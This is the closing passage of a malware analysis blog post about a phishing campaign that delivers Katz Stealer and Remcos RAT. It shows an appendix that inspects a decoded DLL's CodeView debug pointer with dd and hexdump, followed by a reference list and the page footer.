</span></span></code></pre></div><hr><h3 id=appendix-b--pdb-file-presence-verification>Appendix B : PDB File Presence Verification<a hidden class=anchor aria-hidden=true href=#appendix-b--pdb-file-presence-verification>#</a></h3><p>A <strong>PDB</strong> (Program Database) <a href=#references>[21]</a> file is a debug symbol file used by Microsoft compilers to store function names, variable names, and source file paths to aid debugging and analysis.</p><p>As we know from the DiE analysis output, the debug data in the file <code>img_b64_decoded_data</code> (<code>Microsoft.Win32.TaskScheduler.dll</code>) has offset <code>0x003b7fde</code> and size <code>0x3a</code> (58 bytes).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>$ dd if=img_b64_decoded_data of=img_b64_decoded_data_debug.bin bs=1 skip=0x3b7fde count=0x3a status=none
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ hexdump -C img_b64_decoded_data_debug.bin | sed -n &#39;1,4p&#39;
</span></span><span class=line><span class=cl>00000000  52 53 44 53 80 b7 84 65  6a 14 03 4b 8a e3 65 c4  |RSDS...ej..K..e.|
</span></span><span class=line><span class=cl>00000010  66 f2 25 32 01 00 00 00  4d 69 63 72 6f 73 6f 66  |f.%2....Microsof|
</span></span><span class=line><span class=cl>00000020  74 2e 57 69 6e 33 32 2e  54 61 73 6b 53 63 68 65  |t.Win32.TaskSche|
</span></span><span class=line><span class=cl>00000030  64 75 6c 65 72 2e 70 64  62 00                    |duler.pdb.|
</span></span></code></pre></div><p>These 58 bytes in question form a <strong>CodeView (RSDS) debug pointer</strong> <a href=#references>[22]</a>. Meaning it is a <em>pointer</em> (CodeView record) that typically tells debuggers where to find a matching PDB (GUID + age + filename). So we do <strong>not</strong> have a full PDB embedded, just a pointer to a PDB.</p><hr><h2 id=references>References<a hidden class=anchor aria-hidden=true href=#references>#</a></h2><ul><li>[01] <strong>ActiveX Objects</strong> : <a href="https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms221401(v=vs.85)">https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms221401(v=vs.85)</a></li><li>[02] <strong>Windows Management Instrumentation (WMI)</strong> : <a href=https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page>https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page</a></li><li>[03] <strong>Invoke-Expression</strong> : <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.5">https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.5</a></li><li>[04] <strong>Reflective Code Loading</strong> : <a href=https://attack.mitre.org/techniques/T1620/>https://attack.mitre.org/techniques/T1620/</a></li><li>[05] <strong>Task Scheduler Managed Wrapper</strong> : <a href=https://github.com/dahall/TaskScheduler>https://github.com/dahall/TaskScheduler</a></li><li>[06] <strong>Detect It Easy (DiE)</strong> : <a href=https://github.com/horsicq/Detect-It-Easy>https://github.com/horsicq/Detect-It-Easy</a></li><li>[07] <strong>dnlib</strong> : (<a href=https://github.com/0xd4d/dnlib>https://github.com/0xd4d/dnlib</a>)</li><li>[08] <strong>de4dot</strong> : <a href=https://github.com/de4dot/de4dot>https://github.com/de4dot/de4dot</a></li><li>[09] <strong>.NET Reactor Obfuscator</strong> : <a href=https://www.eziriz.com/dotnet_reactor.htm>https://www.eziriz.com/dotnet_reactor.htm</a></li><li>[10] <strong>dnSpy</strong> : <a href=https://dnspy.org/>https://dnspy.org/</a></li><li>[11] <strong>Process Injection - Process Hollowing</strong> : <a href=https://attack.mitre.org/techniques/T1055/012/>https://attack.mitre.org/techniques/T1055/012/</a></li><li>[12] <strong>Understanding Katz Stealer Malware and Its Credential Theft Capabilities (Picus Security)</strong> : <a href=https://www.picussecurity.com/resource/blog/understanding-katz-stealer-malware-and-its-credential-theft-capabilities>https://www.picussecurity.com/resource/blog/understanding-katz-stealer-malware-and-its-credential-theft-capabilities</a></li><li>[13] <strong>Katz Stealer | Powerful MaaS On the Prowl for Credentials and Crypto Assets (SentinelOne)</strong> : <a href=https://www.sentinelone.com/blog/katz-stealer-powerful-maas-on-the-prowl-for-credentials-and-crypto-assets/>https://www.sentinelone.com/blog/katz-stealer-powerful-maas-on-the-prowl-for-credentials-and-crypto-assets/</a></li><li>[14] <strong>Katz Stealer Threat Analysis (Nextron)</strong> : <a href=https://www.nextron-systems.com/2025/05/23/katz-stealer-threat-analysis/>https://www.nextron-systems.com/2025/05/23/katz-stealer-threat-analysis/</a></li><li>[15] <strong>PixelDrain</strong> : <a href=https://pixeldrain.com/>https://pixeldrain.com/</a></li><li>[16] <strong>PixelDrain API Documentation</strong> : <a href=https://pixeldrain.com/api>https://pixeldrain.com/api</a></li><li>[17] <strong>Dissecting REMCOS RAT</strong> : <a href=https://www.elastic.co/security-labs/dissecting-remcos-rat-part-one>https://www.elastic.co/security-labs/dissecting-remcos-rat-part-one</a></li><li>[18] <strong>Recorded Future Triage (Sample Analysis)</strong> : <a href=https://tria.ge/250914-l68nhatzft/>https://tria.ge/250914-l68nhatzft/</a></li><li>[19] <strong>VirusTotal (Sample Analysis)</strong> : <a href=https://www.virustotal.com/gui/file/3ab3bc06210e76b06e75c264e5f5acb4edc11f0f768ed16655181cfda80a72a8>https://www.virustotal.com/gui/file/3ab3bc06210e76b06e75c264e5f5acb4edc11f0f768ed16655181cfda80a72a8</a></li><li>[20] <strong>TAG-144&rsquo;s Persistent Grip on South American Organizations</strong> : <a href=https://www.recordedfuture.com/research/tag-144s-persistent-grip-on-south-american-organizations>https://www.recordedfuture.com/research/tag-144s-persistent-grip-on-south-american-organizations</a></li><li>[21] <strong>Program Database (.PDB) Files</strong> : <a href="https://learn.microsoft.com/en-us/visualstudio/debugger/specify-symbol-dot-pdb-and-source-files-in-the-visual-studio-debugger?view=vs-2022">https://learn.microsoft.com/en-us/visualstudio/debugger/specify-symbol-dot-pdb-and-source-files-in-the-visual-studio-debugger?view=vs-2022</a></li><li>[22] <strong>The RSDS PDF Format</strong> : <a href=https://www.godevtool.com/Other/pdb.htm>https://www.godevtool.com/Other/pdb.htm</a></li></ul><hr></div><footer class=post-footer><ul class=post-tags><li><a href=https://martinkubecka.sk/tags/malware-analysis/>Malware Analysis</a></li><li><a href=https://martinkubecka.sk/tags/phishing-campaign/>Phishing Campaign</a></li><li><a href=https://martinkubecka.sk/tags/steganography/>Steganography</a></li><li><a href=https://martinkubecka.sk/tags/katz-stealer/>Katz Stealer</a></li><li><a href=https://martinkubecka.sk/tags/remcos-rat/>Remcos RAT</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://martinkubecka.sk>Martin Kubeƒçka</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let b=document.querySelector("#menu-trigger"),m=document.querySelector(".menu");b.addEventListener("click",function(){m.classList.toggle("hidden")}),document.body.addEventListener("click",function(e){b.contains(e.target)||m.classList.add("hidden")})</script><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>